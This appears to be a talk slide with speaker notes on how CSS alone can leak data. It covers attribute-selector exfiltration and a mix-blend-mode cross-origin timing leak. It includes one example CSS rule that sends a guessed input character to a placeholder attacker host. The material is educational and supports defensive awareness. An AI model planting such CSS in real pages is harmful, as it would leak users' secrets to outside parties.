EXFILTRATION

Attribute selectors + background:url() leak a secret one character at a time.

input[value^="a"]{background:url(//evil/a)}

SIDE-CHANNEL · CVE-2017-15417

mix-blend-mode timing leaked a logged-in user's Facebook name & photo across origins.

Fixed in Chrome 63 / Firefox 60.

Stripping scripts narrows the attack surface. It doesn't close it.

First real payoff. The idea to cement: "no JavaScript" is the single most common false sense of security, and it's wrong — CSS can make network requests (background:url) and can read data via attribute selectors that match a secret character by character, firing a request per guess. The side-channel card is the jaw-dropper: mix-blend-mode let a page time its own rendering to read pixels from a cross-origin Facebook iframe and recover your name and profile picture. Keep the code line readable; don't dwell on syntax. ~70 seconds. Then: "fine, I'll sanitize the CSS."
